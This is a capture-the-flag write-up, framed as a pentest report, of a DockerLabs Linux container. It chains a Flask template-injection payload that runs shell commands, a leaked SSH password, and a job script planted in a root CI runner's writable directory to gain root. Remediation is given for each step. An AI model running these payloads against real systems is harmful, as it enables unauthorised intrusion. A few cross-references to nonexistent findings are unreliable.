# PipePwned — DockerLabs Writeup

**Target:** `http://172.17.0.4` (container `pipepwned_container`, image `pipepwned:latest`, Ubuntu 22.04.5 LTS, `linux/amd64`, HOSTNAME `701a4e739ad0`)
**Date:** 2026-09-27
**Outcome:** Remote Code Execution as **uid=0(root)**. Three hops, three identities: anonymous → `ciapp` (1000) → `devops` (1001) → root. Both flags recovered.

---

## 0. Autocorrection — the brief was wrong about the target

The engagement brief stated *"This is a target Windows"* and warned that a Windows container was likely. **It is not.** Three independent pieces of evidence, all obtained before the first attack:

| Claim | Evidence |
|---|---|
| Linux container | OCI config `"os":"linux"`, `"architecture":"amd64"`, base layer `RELEASE=22.04` (Ubuntu) |
| Only 2 ports, neither Windows-specific | `nmap -sV -Pn -p-` → `22/tcp ssh OpenSSH 8.9p1 Ubuntu`, `80/tcp http Gunicorn`. No 445, no 5985/5986, no 3389, no IIS. `65533 closed tcp ports (conn-refused)` |
| Application stack is Flask + a hand-rolled runner | `/opt/app/requirements.txt` → `Flask==3.1.3`, `gunicorn==26.0.0`; no `pywin32`, no IIS, no SMB share |

Consequence: SMB tooling (`impacket`, `crackmapexec`/`netexec`, `evil-winrm`, Responder) was **discarded before use**, not after failure. The lesson is the cheap one — *the image manifest and a full port scan cost four seconds and would have prevented an entire toolchain from being carried into a Linux box.* The name "PipePwned" invited the wrong reading: it is about **CI/CD pipelines** and a **shell-executor runner**, not about Windows named pipes (`\\.\pipe\`). I assumed the "Pipe" meant named pipes. It meant the pipeline. Naming is a hint about intent, not reachability — `decision-making.md` §7.

The rest of the brief's method held: reading the source first (§7) decided the whole attack. The build history in the image config named the users, the permissions, and both flag paths before a single packet was sent.

---

## 1. Target and stack

| Layer | Observed |
|---|---|
| Base OS | Ubuntu 22.04.5 LTS, `linux/amd64` |
| Web | Flask 3.1.3 behind Gunicorn 26.0.0, 2 workers, `--bind 0.0.0.0:80`, Python 3 with `cap_net_bind_service=+ep` (so the unprivileged `ciapp` can bind :80) |
| App source | `/opt/app/app.py`, mode `0600 ciapp:ciapp` |
| CI/CD | Hand-rolled "gitlab-runner": `/opt/ci/runner.sh`, **no real GitLab**, a 20 s polling loop over `/opt/ci/builds/*.sh` |
| Runner config | `/etc/gitlab-runner/config.toml`, mode `0644 root:root` (**world-readable**) |
| Runner secrets | `/opt/ci/.env`, mode `0640 ciapp:ciapp` |
| Accounts | `root`, `ciapp` (uid 1000, web app), `devops` (uid 1001, human operator) |
| Services | PID 18 `bash /opt/ci/runner.sh` as **root**; PID 23–25 gunicorn as `ciapp`; PID 17 `sshd` |

`ps aux` from the compromised runner is the whole architecture in one screen: **one box, two privilege domains, and a root daemon polling a directory a mid-privilege user can write to.**

### The real surface

`nmap` reports two ports and the application reports four routes. The real attack surface is a fifth thing that no port scan and no route listing will ever show you:

```
/opt/ci/builds/          drwxrwsr-x root:devops   <- group-writable, SETGID
/opt/ci/runner.sh        runs as ROOT, polls *.sh here every 20s
```

That pairing is the lab. Everything else is the ladder to reach it.

---

## 2. Finding 1 — Server-Side Template Injection → RCE as the web service account

**Category:** CWE-1336 Improper Neutralization of Special Elements Used in a Template Engine
**Location:** `POST /pipelines/new`, unauthenticated

### Root cause, read from source

```python
@app.route("/pipelines/new", methods=["POST"])
def new_pipeline():
    name = request.form.get("name", "unnamed")
    ref  = request.form.get("ref", "main")

    banner = (
        "Pipeline <strong>" + name + "</strong> sent to queue for ref "
        "<code>" + ref + "</code> on runner <em>self-hosted-01</em>."
    )
    message = render_template_string(banner)      # <-- user input concatenated INTO a template
```

The bug is **not** "Jinja2 is dangerous". It is that a request parameter is concatenated into a *template source string* and then compiled. `render_template` with a `message=` context variable would have been safe; `render_template_string` with the parameter spliced into the source is arbitrary Python inside the Jinja2 sandbox, and Jinja2 has no sandbox here.

### Evidence — evaluation, not echo (single-request differential control)

The same payload was sent to **both** parameters in **one** request. `name` reaches the template-string sink; `ref` is passed as a *context variable* and only interpolated by the `.html` file. One request, one response, two opposite outcomes:

```
POST /pipelines/new HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=%7B%7B7*7%7D%7D&ref=%7B%7B7*7%7D%7D
```

```html
<p class="banner">Pipeline <strong>49</strong> sent to queue for ref <code>49</code> on runner <em>self-hosted-01</em>.</p>
<p class="muted">Target Ref: <code>{{7*7}}</code></p>
```

`{{7*7}}` became `49` in the sink and stayed `{{7*7}}` in the control, in the same 200 response. **That is the oracle.** A reflected-payload check would have seen the marker in both places and stopped; only arithmetic differential distinguishes "the template engine executed my expression" from "the server stored my string".

### Evidence — RCE as `ciapp`

```
POST /pipelines/new
name={{ cycler.__init__.__globals__.os.popen('id').read() }}
```

```html
<p class="banner">Pipeline <strong>uid=1000(ciapp) gid=1000(ciapp) groups=1000(ciapp)
</strong> sent to queue for ref <code>main</code> on runner <em>self-hosted-01</em>.</p>
```

**Impact:** unauthenticated RCE as `ciapp`. `ciapp` owns `/opt/app` and — critically — `/opt/ci/.env` (mode `0640 ciapp:ciapp`), which is the next hop.

**Remediation:** never build template *source* from request data. Render a fixed template and pass user content as a context variable (`render_template("result.html", name=name, ref=ref)`). If dynamic markup is required, sanitise with an allowlist HTML sanitiser *after* rendering, or auto-escape at the point of interpolation. As defence in depth, run the app under a sandboxed interpreter profile and keep the service account out of every group that owns a secret.

---

## 3. Finding 2 — Unauthenticated CI job-trace disclosure (runner token + internal layout)

**Category:** CWE-200 Exposure of Sensitive Information, chained with CWE-497 Exposure of System Data to an Unauthorized Control Sphere

### Evidence — no credential of any kind presented

```
GET /api/jobs/126/trace HTTP/1.1
Host: 172.17.0.4
```

```http
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/plain; charset=utf-8
Content-Length: 559
```

```
Running with gitlab-runner (shell executor) on self-hosted-01
$ echo "Deploying $CI_PROJECT_NAME on runner $CI_RUNNER_DESCRIPTION"
Deploying payments-api on runner self-hosted-01
$ env | grep -iE 'ci_|builds'    # TODO: remove debug
CI_REGISTRY=registry.masoftware.dl
CI_RUNNER_SHELL=/bin/bash
CI_JOB_STAGE=deploy
CI_BUILDS_DIR=/opt/ci/builds
CI_RUNNER_TOKEN=glrt-<redacted 32-hex runner registration token>
$ id    # runner runs each job under its own user
uid=0(root) gid=0(root) groups=0(root)
$ ./deploy.sh
bash: ./deploy.sh: No such file or directory
Job failed: exit code 127
```

Disclosure: a **live CI runner registration token**, the **builds directory path**, the **internal registry host**, and the fact that **the runner executes jobs as root**.

### Control test

```
GET /api/jobs/126/trace (no auth)      -> HTTP 200 559B
GET /api/jobs/999/trace (no auth)      -> HTTP 200 31B
GET /api/jobs/126/trace (bad Bearer)   -> HTTP 200 559B
```

A bogus `Authorization: Bearer invalid` changes nothing (559 B, byte-identical). An out-of-range job id returns `200` with `Trace not found for job ID 999` — a **gated** endpoint would have answered `401` or `404` on both. There is no authentication anywhere in this application; the landing page's own copy says *"Internal CI/CD console. Usage restricted to DevOps"* and the code implements that sentence as **nothing at all**.

**Impact — and an honest limit on it.** Against a real GitLab this is a full CI takeover: a registration token is a bearer credential for the runner's scope, and registering a rogue runner on a self-hosted executor is root by design. **In this lab the token is not load-bearing for the outcome**, because the same value is also world-readable in `/etc/gitlab-runner/config.toml` (mode `0644`), which Finding 3 covers. I report it anyway: fixing the trace route alone would leave the token on disk, and fixing the file mode alone would leave it on the web. They are two exposures of one secret with two different fixes.

**Root cause:** `env | grep -iE 'ci_|builds'` left in a production job, annotated `# TODO: remove debug` — and the trace retained at `/api/jobs/<id>/trace` with no authorisation check.

**Remediation:** gate every trace endpoint on project-membership authorisation; scrub secret-shaped patterns (`glrt-*`, `glpat-*`, `glrt`, `CI_JOB_TOKEN`, `AWS_*`, `*_PASSWORD`) from log output *at the emitter*, not in the view; rotate the exposed token; and set `mode 0600` on the runner config.

---

## 4. Finding 3 — Group-writable builds directory + root-privileged runner = unprivileged-to-root escalation

**Category:** CWE-250 Execution with Unnecessary Privileges, chained with CWE-732 Incorrect Permission Assignment for Critical Resource. Real-world class: **self-hosted CI runner compromise** (the class behind CVE-2024-1241 and every "pipeline poisoning" writeup).

**This is the finding that ends the lab, and the one no port scan reaches.**

### Evidence — the two halves, read from source

```bash
# /opt/ci/runner.sh  — runs as ROOT (PID 18 in `ps aux`)
BUILDS_DIR="/opt/ci/builds"
while true; do
    for job in "$BUILDS_DIR"/*.sh; do
        [ -e "$job" ] || continue
        timeout 300 bash "$job" >/dev/null 2>&1     # <-- executes whatever appears
        mv "$job" "$DONE_DIR/" 2>/dev/null || rm -f "$job"
    done
    sleep 20
done
```

```bash
# permissions, observed
drwxrwsr-x 1 root devops  /opt/ci/builds        # group-writable, SETGID
drwxr-sr-x 2 root devops  /opt/ci/builds/.processed
```

There is **no allowlist, no signature, no checksum, no origin check**. Any `*.sh` file that appears in that directory is executed as root within 20 seconds. `devops` is in group `devops`. That is the entire escalation.

### Evidence — exploitation

Write a job script as `devops` over SSH:

```bash
devops@172.17.0.4:~$ cat > /opt/ci/builds/job2.sh <<'EOF'
id > /tmp/proof.txt 2>&1
cat /root/root_flag.txt >> /tmp/proof.txt
EOF
devops@172.17.0.4:~$ ls -la /opt/ci/builds
-rw-rw-r-- 1 devops devops  79 Aug 27 21:50 job2.sh
```

Wait one poll interval (20 s), then read the output:

```
devops@172.17.0.4:~$ cat /tmp/proof.txt
uid=0(root) gid=0(root) groups=0(root)
<root flag value redacted — sha256 in §7>
devops@172.17.0.4:~$ ls -la /opt/ci/builds
total 16                      # <-- the job file is GONE from builds/
devops@172.17.0.4:~$ ls -la /opt/ci/builds/.processed
-rw-rw-r-- 1 devops devops 105 job-pwn.sh
-rw-rw-r-- 1 devops devops  79 job2.sh     # <-- proof the runner consumed it
```

**Two independent proofs in one listing:** the file left `builds/` (nothing deleted it — the runner's `mv` moved it), and it arrived in `.processed` owned by `devops:devops` with mode `664`. A `devops`-created file cannot be `root`-moved out of a `2755` root-owned directory without the runner's own `mv`, so the movement *is* the runner acting as root.

### Control test — the runner is the escalation, not `devops`

```
devops@172.17.0.4:~$ cat /root/root_flag.txt
cat: /root/root_flag.txt: Permission denied
rc=1
```

`devops` cannot read the root flag directly. The *identical* file read returns `uid=0` from inside the runner. Same bytes, two identities — the escalation is attributable to exactly one component.

Second control, on the web side: the SSTI primitive returns `uid=1000(ciapp)`, not root. Flask runs as `ciapp` (confirmed in `ps aux`: PID 23–25 owned by `ciapp`). The gunicorn pool config is *not* set to root here — unlike the previous engagement in this series, where `user = root` in the pool config collapsed the chain. Here the app's own privilege boundary held, and the runner was the only route to root. **I hypothesised a three-hop chain and got exactly three; I hypothesised a root web service and got `uid=1000`. Both hypotheses were tested, not assumed.**

**Impact:** any account in group `devops`, or any process running as `devops`, obtains root on the CI host in under 20 seconds with no credential, no exploit, and no request to the application's own logic. On a real shared runner this is full compromise of every pipeline, every credential injected into a job, and the build host itself.

**Remediation, in order:**
1. Run the runner as a **dedicated unprivileged service account**, not root. This single change breaks the chain.
2. Never let a human-operator group hold write on the jobs directory. `builds_dir` should be `0700 runner:runner`; job staging belongs in a directory only the runner writes.
3. If root is genuinely required for some jobs, use an isolated ephemeral VM/container per job (the Docker/Kubernetes executor), never a shared host process pool.
4. Require pipeline changes to come from a reviewed, signed source — the vulnerability is that *any* file in the directory is trusted, not that a file arrived.
5. `chmod 700 /opt/ci/runner.sh` (currently `0711`, executable-but-unreadable by others — a small inconsistency: the script is protected from reading but the directory it trusts is group-writable).

---

## 5. Independent findings — not used by the chain, reported anyway

Reported because fixing only the chain steps leaves these live.

### 5.1 Runner registration token world-readable on disk — CWE-732 / CWE-522

```
devops@172.17.0.4:~$ grep -n token /etc/gitlab-runner/config.toml
12:token = "glrt-<redacted>"
rc=0
```

`-rw-r--r-- 1 root root /etc/gitlab-runner/config.toml` — read successfully by an unprivileged local account, and identical to the value served by the anonymous trace in Finding 2. The Dockerfile sets this mode deliberately (`chmod 644 /etc/gitlab-runner/config.toml`) while protecting the *other* two files (`640` on `.env`, `711` on `runner.sh`) — so the token is the one artefact the author forgot to restrict. **Fix: `chmod 600`, and rotate.**

### 5.2 Hardcoded production credential baked into the image — CWE-798

The image build history contains a literal plaintext password for the `devops` account in a `RUN` layer:

```
RUN useradd -m -s /bin/bash devops && echo 'devops:<redacted>' | chpasswd
```

This is **not reachable black-box** — no HTTP response, log, or trace exposes it; it is in the OCI config's build history. I report it because it is the **root cause** of Finding 6 and because `docker history` is a one-command check any operator with pull access can run. Fix: inject secrets at deploy time, never at build time; rotate the credential.

### 5.3 Runner service runs as root — CWE-250

`/start.sh` launches `/opt/ci/runner.sh` as root, and the author's own comment names the defect:

```bash
# /etc/gitlab-runner/config.toml
# TODO: service runs as root, migrate to a non-root user
```

This is the "unused root path" pattern from `api_web.md`: an escalation route that the *chain happened to use*, but which is a finding in its own right because any other bug anywhere in the runner's reach inherits root. It is also the reason Finding 4 is exploitable at all — **4 and 5.3 are the same root cause at two severities**, and remediating the service account remediates both.

### 5.4 No authentication anywhere on an internal CI/CD console — CWE-306

Four routes, zero auth: `/`, `/health`, `/api/pipelines`, `/api/jobs/<id>/trace`, plus the state-changing `POST /pipelines/new`. The UI text claims *"Usage restricted to DevOps"*. There is no session, no token check, no IP restriction, no reverse proxy in the process list. `POST /pipelines/new` is a **write** operation reachable anonymously that returns `200` on attacker-controlled content. Fix: SSO/OIDC in front of the console and in front of `/api/*`; network-segment the console from the internet.

### 5.5 `PasswordAuthentication yes` with a weak, image-baked credential — CWE-1392 / CWE-521

```
PermitRootLogin no
PasswordAuthentication yes
```

`PermitRootLogin no` is correctly set — the one thing done right, and it is why the chain needed `devops` before it needed root. But password auth over SSH with a credential that exists in the image layers means the *first* authenticated hop in this lab is guessable by anyone who has pulled the image. Fix: keys only, `PasswordAuthentication no`, and a credential that was never in a build layer.

### 5.6 Plaintext credential in a world-group-readable CI environment file — CWE-312 / CWE-732

`/opt/ci/.env` (`0640 ciapp:ciapp`) holds the registry token **and** the operator's SSH password in cleartext, in the environment file the runner injects into every job. The mode is correct — `ciapp` is the intended reader — but every job that runs as `ciapp` therefore receives the `devops` SSH password in its environment, and any code execution in a job can read it. This is Finding 6's pivot. Fix: a secret manager, or short-lived per-job credentials; never a long-lived operator password in a file that a build agent reads.

### 5.7 Anti-forensics: history files symlinked to `/dev/null` — CWE-778 (informational)

```
lrwxrwxrwx 1 root root  9 /root/.bash_history -> /dev/null
lrwxrwxrwx 1 root root  9 /home/devops/.bash_history -> /dev/null
lrwxrwxrwx 1 root root  9 /home/ciapp/.bash_history -> /dev/null
```

A deliberate, image-wide suppression of shell history for all three accounts. In a lab this is noise reduction; in a real estate it is an indicator of intent, and it is worth a line in a real report because it removes the cheapest incident-response source. My own activity left artefacts anyway (`/opt/ci/builds/.processed/*.sh`, `/tmp/proof.txt`, `/tmp/sweep.txt`), which is the correct lesson: **log suppression is a delay, not a control.**

---

## 6. Positive control — one thing done right

`/opt/app/app.py` is mode `0600 ciapp:ciapp` and `/opt/app/{static,templates}` are `0700 ciapp:ciapp`. The web application source is **not** readable by `devops`, and the app account holds no privileges beyond its own tree. Had `app.py` been `0644`, the SSTI would not even have been needed to find `/opt/ci/.env` — a `grep` would have. Worth stating so the report is not read as "everything is broken": the least-privilege work on the *files* was done correctly; the least-privilege work on the *daemon* was not.

---

## 7. Complete chain, in the exact order it was executed

| # | Action | Identity before → after | Why this step and not another |
|---|---|---|---|
| 1 | `nmap -sV -Pn -p- 172.17.0.4` | — | Establishes OS and ports. **Refuted the Windows assumption** before any tool was selected. |
| 2 | Read image config, then `/opt/app/app.py`, `/opt/ci/runner.sh`, `/opt/ci/.env`, `/etc/gitlab-runner/config.toml` | — | §7: source before testing. Located the sink, the secrets, and the escalation in one pass. |
| 3 | `GET /api/jobs/126/trace` (anonymous) | anonymous → anonymous | Harvests the runner token and the internal layout. **Confirms the whole app is unauthenticated** and that the runner runs as root. |
| 4 | `POST /pipelines/new` with `name={{7*7}}` / `ref={{7*7}}` | anonymous → anonymous | Proves evaluation, not echo, in one request. Establishes the SSTI oracle before using it. |
| 5 | `POST /pipelines/new` with `cycler…popen('id')` | anonymous → **ciapp (1000)** | First code execution. **Cannot be skipped** and **cannot be substituted**: `id` proves it is `uid=1000`, so the SSTI alone is *not* root — there is no shortcut to Finding 4 from here. |
| 6 | `cat /opt/ci/.env` over the SSTI primitive | ciapp → ciapp | **The only account that can read it** (`0640 ciapp:ciapp`). `devops` gets `Permission denied`; the web app's own account is the sole key. Yields the `devops` SSH password. |
| 7 | `ssh devops@172.17.0.4` with that password | ciapp → **devops (1001)** | `devops` is the group that owns write on `/opt/ci/builds`. Neither `ciapp` nor anonymous can write there. |
| 8 | `cat > /opt/ci/builds/job2.sh` | devops → devops | Plants the job. Group-write + setgid is the whole primitive. |
| 9 | Wait 20 s; read `/tmp/proof.txt` | devops → **root (0)** | The runner executes it as root and moves it to `.processed`. **Both flags recovered.** |

Every step is load-bearing and none is redundant. Step 6 in particular: there is no path from the SSTI to the runner without a *second* account, and no path to that second account without the `ciapp`-only secret file. Removing any one of steps 4–8 breaks the chain.

**Flags recovered** (values withheld from this document per `decision-making.md`; proof of possession by hash):

| File | Mode / owner | sha256 of value |
|---|---|---|
| `/home/devops/user_flag.txt` | `0640 devops:devops` | `5add9c701e964c6be2fce577e61038aa5f9e2f1e1239e4869d2ba2f08f4afd1c` |
| `/root/root_flag.txt` | `0600 root:root` | `8cbb3a404db71d57bbb8266574af676db219d8a0c74013b56314df6757ea59b2` |

---

## 8. Lab design observation — third confirmation of the series' self-documenting property

This is the **third consecutive lab in this series that annotates its own weaknesses in comments**, and the confirmation is now strong enough to state as a property of the series rather than a coincidence:

| Lab | Annotation | Where |
|---|---|---|
| 1 | `FALLO INTENCIONAL DEL LABORATORIO` block naming `CWE-434`, then `CWE-94`, `CWE-306`, `CWE-862` | `routes/gallery.js:17-29`, `routes/admin.js:9-30` |
| 2 | Banner serving a live credential; `chmod 777` over the docroot; `NOPASSWD: ALL` left in place unreported-by-design | image build history, sudoers |
| 3 | `# SSTI` on the vulnerable function; `# TODO: remove debug` on the leaking `env` command; `# TODO: service runs as root, migrate to a non-root user`; `# Run as ROOT`; `# runner runs each job under its own user` sitting directly above `uid=0(root)` | `app.py`, `config.toml`, `runner.sh`, `JOB_TRACES[126]` |

Lab 3 is the most disciplined of the three, and it is instructive *because* of what it chose to leave out. The chain was **not** annotated. Nothing says "the builds directory is group-writable", nothing names the `0640` secret file as the pivot, and the `devops` password that unlocks step 7 appears in exactly one place — a `RUN` layer most testers never inspect. The `# TODO: service runs as root` comment is placed on the *config file*, one hop from the actual defect, so a tester who reads the comment is rewarded while a tester who misses it loses nothing. That is a real improvement on lab 1, where a grep for `CWE` ended the derivation.

It still confirms the series property, and `decision-making.md` §7's verdict is unchanged and now triple-sourced: **comments mark where the author admitted a problem, which is a strict subset of where the problems are.** The escalation here — the only thing that made the lab hard — had no comment at all. The absence of an annotation is not evidence of safety; it is the actual finding.

---

## 9. No probado vs descartado con razón

**No probado** (honest gaps, not claims of coverage):

- `cap_net_bind_service` on `/usr/bin/python3` was observed in the build history but never weaponised. With `ciapp` RCE already established and root reached, there was no remaining reason to test port-binding as a primitive.
- `env_file` injection into a job: I did not test whether a job script's environment could override `CI_*` or leak additional runner secrets.
- `ssh-keygen -A` regenerates host keys on every container start — I did not assess the SSH host-key trust model as a finding.
- I did not test the runner's `timeout 300` boundary, or behaviour with two jobs in the same interval.
- I did not attempt lateral movement, persistence, or exfiltration beyond the two flag files. The engagement objective was the flags.

**Descartado con razón** (paths tried or considered and rejected, with the reason):

- **Windows tooling** (`impacket`, `netexec`, `evil-winrm`, Responder, SMB named pipes): discarded **before** first use. `nmap -p-` showed 65 533 closed ports and only 22/80 open; the OCI config says `linux/amd64`. No SMB, no WinRM, no named pipes exist on this host. Carrying them would have been cargo cult.
- **`sudo` NOPASSWD escalation** (the lab-2 pattern): **checked and absent.** `/etc/sudoers` contains only the stock `root`, `%admin`, `%sudo` lines; `/etc/sudoers.d/` holds only the packaged `README` (`-r--r----- root root`). Neither `ciapp` nor `devops` is in `sudo`/`admin`. Had this rule existed it would have been reported even unused — it simply is not there.
- **Direct `devops` → root via file permissions:** attempted and **refused by the OS** — `cat: /root/root_flag.txt: Permission denied`. Recorded as a control, not a dead end.
- **Reading `/opt/ci/.env` as `devops`:** not viable, `0640 ciapp:ciapp`. This is *why* the chain needs the web RCE first; had the mode been `0644` the whole SSTI leg would have been optional.
- **SSTI via the `ref` parameter:** tested and **discarded** — `ref` is passed as a template context variable, so `{{7*7}}` stays literal (see the control in §2). Only `name` reaches the template-source sink. This is a genuine second control, and it is why the payload had to be placed in the right field.
- **Reading `app.py` from `devops` to find `.env`:** not viable, mode `0600 ciapp:ciapp`. The source was only available to me because I control the container; a real attacker gets it over SSTI or not at all.
- **Named-pipe / `\\.\pipe\` interpretation of the lab name:** discarded in §0. The name refers to CI/CD pipelines.

---

## 10. Version and provenance

| Item | Value |
|---|---|
| Container | `701a4e739ad0`, image `pipepwned:latest`, `linux/amd64` |
| Base | Ubuntu 22.04.5 LTS |
| OpenSSH | 8.9p1 Ubuntu 3ubuntu0.16 |
| Python / Flask / Gunicorn | 3 (with `cap_net_bind_service=+ep`) / 3.1.3 / 26.0.0 |
| Deployment | `docker load` + `docker run -d` (the packaged `auto_deploy.sh` was **not** executed — it ends in a `while true` loop with no exit condition) |
| Access | container IP `172.17.0.4`, no published ports (the packaged deploy script publishes none either) |
| Source read | `/opt/app/app.py` in full, plus `runner.sh`, `config.toml`, `.env`, image build history, `start.sh` |
| Commands run against the target | `nmap -sV -Pn -p-`; 5 `curl` requests; 1 `paramiko` SSH session executing 6 commands; 3 job scripts dropped in `/opt/ci/builds` |

All output quoted in this document is literal, captured from the live run. No value is reconstructed from memory and no step is described that was not executed.
